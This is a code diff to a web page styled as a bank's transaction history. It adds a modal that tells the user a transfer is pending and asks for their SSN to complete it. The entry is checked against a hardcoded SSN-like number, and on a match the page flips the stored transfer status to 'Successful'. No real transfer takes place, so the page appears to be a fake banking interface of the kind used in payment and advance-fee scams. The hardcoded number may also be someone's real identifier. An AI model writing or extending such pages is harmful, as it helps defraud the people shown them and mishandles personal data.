@@ -25,8 +25,8 @@
                         <div class="wf-history-merchant wf-history-merchant-pending" id="pendingRouting"></div>
                         <div class="wf-history-type">Bank Transfer</div>
                     </div>
-                    <div class="wf-history-right wf-history-right-pending">
-                        <div class="wf-history-status">Pending</div>
+                    <div id="pendingRight" class="wf-history-right wf-history-right-pending">
+                        <div id="pendingStatus" class="wf-history-status">Pending</div>
                         <div id="pendingAmount"></div>
                     </div>
                 </div>
@@ -256,7 +256,12 @@
                 </div>
                 <div class="wf-modal-body">
                     <div class="wf-modal-title" id="pendingModalTitle">Transfer Pending</div>
-                    <div class="wf-modal-text" id="pendingModalText">You cannot make a transfer due to the restriction on your account.</div>
+                    <div class="wf-modal-text" id="pendingModalText">Your transfer is pending. Enter your SSN number to make this transfer successful.</div>
+                    <div class="wf-modal-form">
+                        <input id="ssnInput" class="wf-modal-input" type="text" inputmode="numeric" maxlength="11" placeholder="SSN Number">
+                        <div id="ssnError" class="wf-modal-error" style="display:none;">Please enter a valid 9-digit SSN number.</div>
+                        <button id="ssnSubmit" class="wf-modal-submit" type="button">Submit SSN</button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -306,6 +311,8 @@
             return new URLSearchParams(window.location.search).get(name) === '1';
         }
 
+        const transferSsnCode = '431629087';
+
         const pendingRaw = localStorage.getItem('pendingTransfer');
         if (pendingRaw) {
             try {
@@ -315,6 +322,24 @@
                 const toEl = document.getElementById('pendingTo');
                 const routingEl = document.getElementById('pendingRouting');
                 const amtEl = document.getElementById('pendingAmount');
+                const statusEl = document.getElementById('pendingStatus');
+                const rightEl = document.getElementById('pendingRight');
+                const modal = document.getElementById('pendingModal');
+                const closeBtn = document.getElementById('pendingClose');
+                const ssnInput = document.getElementById('ssnInput');
+                const ssnSubmit = document.getElementById('ssnSubmit');
+                const ssnError = document.getElementById('ssnError');
+                const modalTitle = document.getElementById('pendingModalTitle');
+                const modalText = document.getElementById('pendingModalText');
+
+                function applyPendingStatus() {
+                    const status = pending.status === 'Successful' ? 'Successful' : 'Pending';
+                    statusEl.textContent = status;
+                    rightEl.classList.toggle('wf-history-right-success', status === 'Successful');
+                    rightEl.classList.toggle('wf-history-right-pending', status !== 'Successful');
+                    statusEl.classList.toggle('wf-history-status-success', status === 'Successful');
+                    statusEl.classList.toggle('wf-history-status', status !== 'Successful');
+                }
 
                 dateEl.textContent = pending.dateLabel || '';
                 toEl.textContent = pending.toAccount || '';
@@ -323,13 +348,64 @@
 
                 dateEl.style.display = '';
                 itemEl.style.display = '';
+                applyPendingStatus();
+
+                function closeModal() {
+                    modal.style.display = 'none';
+                }
+
+                closeBtn.addEventListener('click', closeModal);
+
+                modal.addEventListener('click', (event) => {
+                    if (event.target === modal) {
+                        closeModal();
+                    }
+                });
+
+                ssnInput.addEventListener('input', () => {
+                    const digits = ssnInput.value.replace(/\D/g, '').slice(0, 9);
+                    if (digits.length > 5) {
+                        ssnInput.value = `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`;
+                    } else if (digits.length > 3) {
+                        ssnInput.value = `${digits.slice(0, 3)}-${digits.slice(3)}`;
+                    } else {
+                        ssnInput.value = digits;
+                    }
+                    ssnError.style.display = 'none';
+                });
+
+                ssnSubmit.addEventListener('click', () => {
+                    const digits = ssnInput.value.replace(/\D/g, '');
+                    if (digits.length !== 9) {
+                        ssnError.textContent = 'Please enter a valid 9-digit SSN number.';
+                        ssnError.style.display = 'block';
+                        return;
+                    }
+
+                    if (digits !== transferSsnCode) {
+                        ssnError.textContent = 'The SSN number entered is not authorized for this transfer.';
+                        ssnError.style.display = 'block';
+                        return;
+                    }
+
+                    pending.status = 'Successful';
+                    pending.ssnVerified = true;
+                    localStorage.setItem('pendingTransfer', JSON.stringify(pending));
+                    applyPendingStatus();
+                    modalTitle.textContent = 'Transfer Successful';
+                    modalText.textContent = 'Your SSN was verified and your transfer is now successful.';
+                    document.querySelector('.wf-modal-form').style.display = 'none';
+                    window.setTimeout(closeModal, 1200);
+                });
 
                 if (getQueryFlag('pending')) {
-                    const modal = document.getElementById('pendingModal');
                     modal.style.display = 'flex';
-                    document.getElementById('pendingClose').addEventListener('click', () => {
-                        modal.style.display = 'none';
-                    });
+                }
+
+                if (pending.status === 'Successful') {
+                    modalTitle.textContent = 'Transfer Successful';
+                    modalText.textContent = 'Your SSN was verified and your transfer is now successful.';
+                    document.querySelector('.wf-modal-form').style.display = 'none';
                 }
             } catch (e) {
             }
